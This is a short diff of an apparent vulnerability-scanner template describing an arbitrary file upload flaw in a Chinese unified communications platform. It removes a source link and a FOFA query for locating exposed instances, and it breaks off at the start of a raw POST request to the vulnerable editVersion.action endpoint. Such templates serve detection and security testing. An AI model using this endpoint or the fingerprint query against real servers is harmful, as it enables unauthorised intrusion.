@@ -3,12 +3,8 @@ info:
   name: 网动统一通信平台-editVersion.action存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hzl6yquqw4vgl8u9'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hzl6yquqw4vgl8u9
-    fofa: body="网动统一通信平台" || title="网动统一通信平台"
 http:
 - raw:
   - 'POST /acenter/version!editVersion.action HTTP/1.1
